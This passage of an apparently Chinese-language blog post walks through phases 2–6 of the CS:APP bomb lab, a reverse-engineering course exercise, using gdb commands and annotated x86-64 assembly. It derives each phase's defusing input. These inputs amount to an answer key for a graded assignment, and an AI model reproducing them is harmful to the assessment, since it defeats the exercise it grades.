beenbetter.</p><h2 id="bomb2">bomb2</h2><p>从源码可以看出，在read_six_number中进行判断。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">break</span> *main+182 <br><span class="hljs-comment"># 自动输入第一次的结果</span><br>run a.txt<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs assembly">sub    $0x18,%rsp                                                    <br><br>mov    %rsi,%rdx                                                        <br>lea    0x4(%rsi),%rcx                                                   <br>lea    0x14(%rsi),%rax                                                   <br>mov    %rax,0x8(%rsp)                                                   <br>lea    0x10(%rsi),%rax                                                   <br>mov    %rax,(%rsp)                                                      <br>lea    0xc(%rsi),%r9                                                    <br>lea    0x8(%rsi),%r8                                                     <br># 第二个参数<br>mov    $0x4025c3,%esi                                                   <br>mov    $0x0,%eax<br># int sscanf(const char *str, const char *format, ...)<br># 先存到栈顶<br>callq  0x400bf0 &lt;__isoc99_sscanf@plt&gt;                                  <br>cmp    $0x5,%eax <br># 不知道具体的format尝试1 2 3 4 5 6 得到eax=6,成功跳过第一个explode  <br># x/16s 4025c3即可得到format &quot;%d %d %d %d %d %d&quot;<br>jg     0x401499 &lt;read_six_numbers+61&gt;<br>callq  0x40143a &lt;explode_bomb&gt;<br># 释放空间<br>add    $0x18,%rsp  <br>retq   <br><br># 第一个int，比较rsp的开头是不是1<br>cmpl   $0x1,(%rsp)<br>je     0x400f30 &lt;phase_2+52&gt;<br>0x40143a &lt;explode_bomb&gt;<br><br># 4byte存储第二个int <br># rsp = 0x7fffffffda90 rbx = 0x7fffffffda94 第二个int<br>lea    0x4(%rsp),%rbx<br># 16 + 8 = 24 byte 的空间 rbp为末尾<br>lea    0x18(%rsp),%rbp<br># ---------- jump ----------- <br># ... 不就是第一个数字<br>mov    -0x4(%rbx),%eax<br><br># 所以第二个int等于第一个int *2 <br>add    %eax,%eax<br>cmp    %eax,(%rbx)<br><br># 第三个int<br>add    $0x4,%rbx<br># 比较rbx是否到头<br>cmp    %rbp,%rbx<br># 比较是否等于2倍的代码<br>jne    0x400f17 &lt;phase_2+27&gt;<br># 直接退出的函数<br>jmp    0x400f3c &lt;phase_2+64&gt;<br><br># 所以得到两倍递推 <br># 1 2 4 8 16 <br></code></pre></td></tr></table></figure><p>较第一问轻松了不少，熟悉了指令集的分析方式。</p><h2 id="bomb3">bomb3</h2><p>照例先分析汇编找方向，从scanf入手</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">break</span> *main+210<br><span class="hljs-comment"># 自动输入第一次的结果</span><br>run a.txt<br><span class="hljs-comment"># 查看format</span><br>i r rsi<br>x/16s addr<br><span class="hljs-comment"># 得到 &quot;%d %d&quot;</span><br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs assembly"># 可知所处的位置 接受的第一 第二个int<br>0x400f4c &lt;phase_3+9&gt;    lea    0x8(%rsp),%rdx<br>0x400f47 &lt;phase_3+4&gt;    lea    0xc(%rsp),%rcx<br><br># 第一个int应该比7小<br>cmpl   $0x7,0x8(%rsp)<br>ja     0x400fad &lt;phase_3+106&gt; # explode <br><br>mov    0x8(%rsp),%eax <br># jump directly<br>jmpq   *0x402470(,%rax,8)<br><br># x/24x 0x402470 0-7对应的跳转路线<br>0x00400f7c # 下一跳指令 <br><br>0x00400fb9 # 可跳转到<br>mov    $0x137,%eax<br># 十六进制的137<br>cmp    0xc(%rsp),%eax<br>je     0x400fc9 &lt;phase_3+134&gt;<br><br>0x00400f83  0x00400f8a 0x00400f91 0x00400f98  x00400f9f  0x00400fa6<br><br># 可知 1 311 <br><br></code></pre></td></tr></table></figure><h2 id="bomb4">bomb4</h2><p>同理，scanf 入手</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">break</span> *main+238<br>run a.txt<br>i r rsi<br>x/16s addr<br><span class="hljs-comment"># &quot;%d %d&quot;</span><br></code></pre></td></tr></table></figure><p>后分析汇编</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs assembly"># 两组<br>cmp    $0x2,%eax<br>jne    0x401035 &lt;phase_4+41&gt; # explode<br><br># 首位不为15<br>cmpl   $0xe,0x8(%rsp)<br>jbe    0x40103a &lt;phase_4+46&gt;<br><br># 调用func4, 先分析后面来判断func4的要求<br><br># eax为1时不跳转<br>test   %eax,%eax<br>jne    0x401058 &lt;phase_4+76&gt; # explode  <br><br># 第二个数字为0<br>cmpl   $0x0,0xc(%rsp) <br>je     0x40105d &lt;phase_4+81&gt;<br><br># 后分析func4 输入<br># edi = 第一个数字 | 三个参数 esi = 0  edx = 15 <br>mov    %edx, %eax # eax = 15<br># eax &lt;- eax - esi<br>sub    %esi, %eax # eax = eax <br>mov    %eax, %ecx # ecx = eax <br># ecx &lt;- ecx &gt;&gt; ecx位数<br>shr    $0x1f,%ecx # 0x1f = 16 + 15 = 31; ? ecx &gt;&gt; 31<br>add    %ecx,%eax # eax &lt;- ecx + eax<br>sar    %eax # eax &lt;- eax / 2<br># ecx &lt;- rax + rsi * 1<br>lea    (%rax,%rsi,1),%ecx # ecx &lt;- rax + rsi * 1 <br><br># 不应跳转，即要ecx &gt; edi<br>cmp    %edi,%ecx <br>jle    0x400ff2 &lt;func4+36&gt; # false 失败<br><br>lea    -0x1(%rcx),%edx # edx &lt;- ecx - 1<br># 递归 6<br>callq  0x400fce &lt;func4&gt;<br><br># 递归出口<br>add    %eax,%eax eax &lt;- eax * 2<br>jmp    0x401007 &lt;func4+57&gt;<br><br># 若ecx &lt; edi <br>mov    $0x0,%eax # eax = 0<br>cmp    %edi,%ecx <br># 若 ecx &gt;= edi, return 0 <br>jge    0x401007 &lt;func4+57&gt;<br> <br>lea    0x1(%rcx),%esi # esi &lt;- rcx + 1<br>callq  0x400fce &lt;func4&gt; <br># 输出<br>lea    0x1(%rax,%rax,1),%eax  # eax &lt;- 2 * eax + 1<br># return<br></code></pre></td></tr></table></figure><p>化为C语言分析，reg容易混乱</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// func4(input, 0, 15)</span><br><span class="hljs-comment">// eax = tmp </span><br><span class="hljs-type">int</span> <span class="hljs-title function_">func4</span><span class="hljs-params">(<span class="hljs-type">int</span> a, <span class="hljs-type">int</span> b, <span class="hljs-type">int</span> c)</span> &#123;<br>    <span class="hljs-type">int</span> tmp = c;<br>    tmp -= b;<br>    <span class="hljs-type">int</span> v = tmp;<br>    v = v &gt;&gt; <span class="hljs-number">31</span>;<br>    tmp += v;<br>    tmp = tmp &gt;&gt; <span class="hljs-number">1</span>;<br>    v = tmp + b;<br>    <span class="hljs-keyword">if</span> (v &lt;= a) jump nxt;<br>    c = v - <span class="hljs-number">1</span>;<br>    <span class="hljs-comment">// ecx会在一开始就被覆盖，只是局部变量</span><br>    tmp = func4(a, b, c);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">2</span> * tmp;<br>    nxt:<br>    tmp = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">if</span> (v &gt;= a) <span class="hljs-keyword">return</span> tmp;<br>    <br>    b = v + <span class="hljs-number">1</span>;<br>    tmp = func4(a, b, c);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">2</span> * tmp + <span class="hljs-number">1</span>;<br>&#125;<br><br><span class="hljs-comment">// 优化逻辑 a != 15</span><br><span class="hljs-comment">// 直接模拟 </span><br><span class="hljs-type">int</span> <span class="hljs-title function_">func4</span><span class="hljs-params">(<span class="hljs-type">int</span> a, <span class="hljs-type">int</span> b, <span class="hljs-type">int</span> c)</span> &#123;<br>    <span class="hljs-type">int</span> v;<br>    <span class="hljs-comment">// 7</span><br>    <span class="hljs-type">int</span> tmp = ((c - b) + (c - b) &gt;&gt; <span class="hljs-number">31</span>) / <span class="hljs-number">2</span>;<br>    v = tmp + b;<br>    <span class="hljs-keyword">if</span> (v == a) <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    <span class="hljs-comment">// 2 * func4(1, 6, )</span><br>    <span class="hljs-keyword">if</span> (v &gt; a) <span class="hljs-keyword">return</span> <span class="hljs-number">2</span> * func4(a, b, v - <span class="hljs-number">1</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">2</span> * func4(a, v + <span class="hljs-number">1</span>, c) + <span class="hljs-number">1</span>;<br>&#125;<br><br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt;= <span class="hljs-number">15</span>; i++) &#123;<br>    <span class="hljs-built_in">cout</span> &lt;&lt; func4(i, <span class="hljs-number">0</span>, <span class="hljs-number">15</span>) &lt;&lt; <span class="hljs-built_in">endl</span>;<br>&#125;<br><br><span class="hljs-comment">// 综上 1 0；3 0；7 0 应该都可以</span><br><span class="hljs-comment">// 根据验证 确实</span><br></code></pre></td></tr></table></figure><h2 id="bomb5">bomb5</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">break</span> *main+266<br>run a.txt<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs assembly"># 栈的首地址<br>push   %rbx<br>sub    $0x20,%rsp<br>mov    %rdi,%rbx<br><br># 段寻址判断溢出<br>mov    %fs:0x28,%rax<br>mov    %rax,0x18(%rsp)<br><br># 长度为6<br>callq  40131b &lt;string_length&gt;<br>cmp    $0x6,%eax<br>je     4010d2 &lt;phase_5+0x70&gt;<br><br># jump_1<br>mov    $0x0,%eax<br>jmp    40108b &lt;phase_5+0x29&gt;<br><br># jump_2<br># 此处rbx已经等于rdi即输入的地址 即第一个byte的0拓展，对照可知取的时第一个字符的ASCII码<br>movzbl (%rbx,%rax,1),%ecx<br># 这里取ecx的第一个byte到rsp的地址 0x7fffffffdaa0<br>mov    %cl,(%rsp)<br># 栈顶值为 0x402261 <br># x/4x 0x7fffffffdaa0  0x61 0x22 0x40 0x00 同样看出小端序<br>mov    (%rsp),%rdx<br># 15, mask, 保留末四位<br>and    $0xf,%edx<br># 偏移<br>movzbl 0x4024b0(%rdx),%edx<br># dl，也就是edx的最后值，作为参数，要对应flyers<br>mov    %dl,0x10(%rsp,%rax,1)<br>add    $0x1,%rax<br>cmp    $0x6,%rax<br># 重复6次<br>jne    40108b &lt;phase_5+0x29&gt;<br><br># 这里可知最后的结果时flyers<br>movb   $0x0,0x16(%rsp)<br>mov    $0x40245e,%esi<br>lea    0x10(%rsp),%rdi<br>callq  401338 &lt;strings_not_equal&gt;<br><br># 需要返回eax=0，有ZF等于1<br>test   %eax,%eax<br># je不能有溢出 ZF等于1时<br>je     4010d9 &lt;phase_5+0x77&gt;<br><br># jump<br>mov    0x18(%rsp),%rax<br># 确定栈没问题<br>xor    %fs:0x28,%rax<br>je     4010ee &lt;phase_5+0x8c&gt;<br>retq<br><br># 根据以上可知，只要根据 x 0x4024b0 maduiersnfotvbylSo 拼出flyers即可<br># 因为只保留末四位，即16进制的最后一位，因此，最后一位分别为 9 F E 5 6 7<br># 对着表找到 9ON567<br></code></pre></td></tr></table></figure><h2 id="bomb6">bomb6</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">break</span> *main+294<br><span class="hljs-comment"># 循环太长需要跳过 c</span><br><span class="hljs-built_in">break</span> *phase_6+95 <br><span class="hljs-built_in">break</span> *phase_6+123<br><span class="hljs-built_in">break</span> *phase_6+183<br><span class="hljs-built_in">break</span> *phase_6+222<br>run a.txt<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br></pre></td><td class="code"><pre><code class="hljs assembly"># push...<br>sub    $0x50,%rsp<br># 栈顶<br>mov    %rsp,%r13<br>mov    %rsp,%rsi<br><br># 存到了 r12 13 <br>callq  40145c &lt;read_six_numbers&gt;<br>mov    %rsp,%r14<br>mov    $0x0,%r12d<br><br># 0x401114<br># 可以看出比较的rbp下移了<br>mov    %r13,%rbp<br>mov    0x0(%r13),%eax<br># 此时rsp r14 r13 rbp <br># eax = int_1<br><br># int_1 &lt;= 6 be below and equal <br>sub    $0x1,%eax<br>cmp    $0x5,%eax<br>jbe    401128 &lt;phase_6+0x34&gt;<br>callq  0x40143a &lt;explode_bomb&gt;<br><br># 401128 6次循环 <br>add    $0x1,%r12d<br>cmp    $0x6,%r12d<br>je     401153 &lt;phase_6+0x5f&gt;<br><br># 401135<br># ebx = 1第一次循环<br>mov    %r12d,%ebx<br># eax = ebx (循环次数)<br>movslq %ebx,%rax<br># eax = int_1 | 4byte，可以看出是int_1<br>mov    (%rsp,%rax,4),%eax<br># 栈顶 int_1 != int_2 <br>cmp    %eax,0x0(%rbp)<br>jne    401145 &lt;phase_6+0x51&gt;<br>callq  40143a &lt;explode_bomb&gt;<br><br># 401145<br># ebx++; 可以看出，这里要求每个后序数字都不等于第一个数字<br>add    $0x1,%ebx<br>cmp    $0x5,%ebx<br>jle    401135 &lt;phase_6+0x41&gt;<br><br># 继续循环 r13 + 4 下一个byte<br>add    $0x4,%r13<br>jmp    0x401114 &lt;phase_6+32&gt;<br><br># 可以看出上面要求每个数字小于等于6，且各不相同 取 1 2 3 4 5 6<br><br># 401153 <br># 18即为24byte rsi为结束位<br>lea    0x18(%rsp),%rsi<br># 保留栈顶 rax rsp<br>mov    %r14,%rax<br># ecx = 7<br>mov    $0x7,%ecx<br><br># 401160<br># edx = 7<br>mov    %ecx,%edx<br># edx -= int<br>sub    (%rax),%edx<br># int_1 -= 7<br>mov    %edx,(%rax)<br># rax += 4<br>add    $0x4,%rax<br># 是否最后一个byte<br>cmp    %rsi,%rax<br>jne    401160 &lt;phase_6+0x6c&gt;<br><br># 以上的目的是将每个数7-int 变为 6 5 4 3 2 1]<br><br># 40116f<br># r/esi = 0<br>mov    $0x0,%esi<br>jmp    401197 &lt;phase_6+0xa3&gt;<br><br># *(rdx + 8) = rdx 正好等于rdx + 16, 这里一开始以为是直接赋值 + 16 。。。<br>mov    0x8(%rdx),%rdx<br># int &gt; 1, eax = 2<br>add    $0x1,%eax<br>cmp    %ecx,%eax<br># int &gt; 1, 若eax != ecx， 则重复<br>jne    401176 &lt;phase_6+0x82&gt;<br># int &gt; 1, 有此时ecx == eax == int <br>jmp    401188 &lt;phase_6+0x94&gt;<br><br># 401183<br># 可以看出若int == 1, 则直接执行这一步<br>mov    $0x6032d0,%edx<br><br># 401188<br># *(rsp + 8 * id) = rdx<br>mov    %rdx,0x20(%rsp,%rsi,2)<br># rsi += 4 可以看出留了8个byte<br>add    $0x4,%rsi<br># 6个数字<br>cmp    $0x18,%rsi<br>je     4011ab &lt;phase_6+0xb7&gt; <br><br># 结束循环 跳转<br><br># 401197<br># ecx = int_1<br>mov    (%rsp,%rsi,1),%ecx<br>cmp    $0x1,%ecx<br># 若ecx &lt;= 1 401183<br>jle    401183 &lt;phase_6+0x8f&gt;<br># 若ecx &gt; 1<br>mov    $0x1,%eax<br>mov    $0x6032d0,%edx<br>jmp    401176 &lt;phase_6+0x82&gt;<br><br># 可以看出，上面的函数就是把数字的偏置转移到了0x6032d0的偏置，并把对应的值按顺序存到了rsp70之后。 <br># x/48x 0x7fffffffda70<br>0x7fffffffda70: 0x20    0x33    0x60    0x00    0x00    0x00    0x00    0x00<br>0x7fffffffda78: 0x10    0x33    0x60    0x00    0x00    0x00    0x00    0x00<br>0x7fffffffda80: 0x00    0x33    0x60    0x00    0x00    0x00    0x00    0x00<br>0x7fffffffda88: 0xf0    0x32    0x60    0x00    0x00    0x00    0x00    0x00<br>0x7fffffffda90: 0xe0    0x32    0x60    0x00    0x00    0x00    0x00    0x00<br>0x7fffffffda98: 0xd0    0x32    0x60    0x00    0x00    0x00    0x00    0x00<br><br># 4011ab<br># rbx = *(rsp + 20) = cv1<br>mov    0x20(%rsp),%rbx<br># rax = rsp + 28<br>lea    0x28(%rsp),%rax<br># rsi = end<br>lea    0x50(%rsp),%rsi<br># rcx = rbx = cv<br>mov    %rbx, %rcx<br><br># 4011bd<br># rdx = *rax = cv_next<br>mov    (%rax),%rdx<br># *(rcx + 8) = rdx；*(cv + 8) = cv_next<br>mov    %rdx,0x8(%rcx)<br># rax += 8 指向cv_next<br>add    $0x8,%rax<br># 是否结束<br>cmp    %rsi,%rax<br>je     4011d2 &lt;phase_6+0xde&gt;<br># rcx = rdx<br>mov    %rdx,%rcx<br># 继续循环<br>jmp    4011bd &lt;phase_6+0xc9&gt;<br><br># 上面函数的含义在于 在cv + 8 存储 cv_next的信息<br># x/64b 0x6032d8<br># 6032e0是默认值 第一行的值<br><br>0x6032d8: 0xe0    0x32    0x60    0x00    0x00    0x00    0x00    0x00<br>0x6032e8: 0xd0    0x32    0x60    0x00    0x00    0x00    0x00    0x00<br>0x6032f8: 0xe0    0x32    0x60    0x00    0x00    0x00    0x00    0x00<br>0x603308: 0xf0    0x32    0x60    0x00    0x00    0x00    0x00    0x00<br>0x603318: 0x00    0x33    0x60    0x00    0x00    0x00    0x00    0x00<br>0x603328: 0x10    0x33    0x60    0x00    0x00    0x00    0x00    0x00<br><br># 4011d2<br># 将rdx的值清0<br>movq   $0x0,0x8(%rdx)<br># ebp = 5<br>mov    $0x5,%ebp<br><br># 4011df<br># 此时rbx为cv1, 即 rax = *(cv1 + 8) = cv2<br># 第五次 rax = *(cv5 + 8) = cv6<br>mov    0x8(%rbx),%rax<br># eax = *cv2 = cv2&#x27; (！注意这里并没有 + 8)<br>mov    (%rax),%eax<br><br>cmp    %eax,(%rbx)<br>jge    4011ee &lt;phase_6+0xfa&gt;<br>callq  40143a &lt;explode_bomb&gt;<br><br># 4011ee <br>mov    0x8(%rbx),%rbx<br>sub    $0x1,%ebp<br>jne    4011df &lt;phase_6+0xeb&gt;<br><br># 比较所有的数字，cv2 &gt;= cv3, 即要满足递减，即 <br># cv2&#x27; &gt;= cv3&#x27;<br># 实际比较的是未加8的值...<br># 14c a8 39c 2b3 1dd 1bb<br># id: 1  2  3  4  5  6<br>#  3 4 5 6 1 2<br>#  4 3 2 1 6 5<br># Got it !! <br>retq<br></code></pre></td></tr></table></figure><h1 id="收获">收获</h1><ol 